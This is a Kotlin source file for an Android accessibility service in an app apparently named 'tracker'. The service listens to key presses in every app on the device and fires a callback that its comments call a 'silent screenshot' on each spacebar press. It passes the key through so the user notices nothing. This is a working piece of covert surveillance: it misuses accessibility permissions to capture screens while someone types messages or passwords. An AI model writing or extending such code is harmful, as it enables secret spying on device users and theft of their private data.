package com.tracker.app.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.util.Log
import android.view.KeyEvent
import android.view.accessibility.AccessibilityEvent

/**
 * AccessibilityService that listens for global key events.
 * When the spacebar is pressed in ANY app, it triggers a silent screenshot.
 */
class SpacebarAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "SpacebarService"
        var instance: SpacebarAccessibilityService? = null
        var onSpacebarPressed: (() -> Unit)? = null
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this

        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            // Listen for key events from all apps
            flags = AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS or
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            notificationTimeout = 100
        }
        serviceInfo = info
        Log.d(TAG, "Spacebar Accessibility Service connected")
    }

    override fun onKeyEvent(event: KeyEvent): Boolean {
        if (event.action == KeyEvent.ACTION_DOWN && event.keyCode == KeyEvent.KEYCODE_SPACE) {
            Log.d(TAG, "SPACEBAR PRESSED - triggering screenshot")
            onSpacebarPressed?.invoke()
            // Return false so the key event still passes through to the app
            return false
        }
        return super.onKeyEvent(event)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        // We don't need to process accessibility events, only key events
    }

    override fun onInterrupt() {
        Log.d(TAG, "Accessibility service interrupted")
    }

    override fun onDestroy() {
        instance = null
        super.onDestroy()
    }
}
